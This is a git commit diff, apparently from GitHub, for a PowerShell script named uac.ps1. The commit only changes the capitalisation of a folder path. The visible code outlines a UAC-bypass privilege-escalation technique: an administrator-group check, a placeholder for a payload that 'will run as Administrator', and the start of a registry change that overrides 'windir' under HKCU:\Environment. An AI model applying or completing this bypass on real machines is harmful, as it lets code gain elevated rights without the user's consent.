36a43bddf7932519a0b241106b3c8e91cc5dff77
Shad0w-Eagle <167417449+Shad0w-Eagle@users.noreply.github.com>
2025-02-25 17:03:07 +0530

    Update uac.ps1

--- uac.ps1
+++ uac.ps1
@@ -1,7 +1,7 @@
 if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
     #Payload goes here
     #It'll run as Administrator
-    mkdir c:\windows\uas-bypass
+    mkdir C:\Windows\uas-bypass
 } else {
     $registryPath = "HKCU:\Environment"
     $Name = "windir"
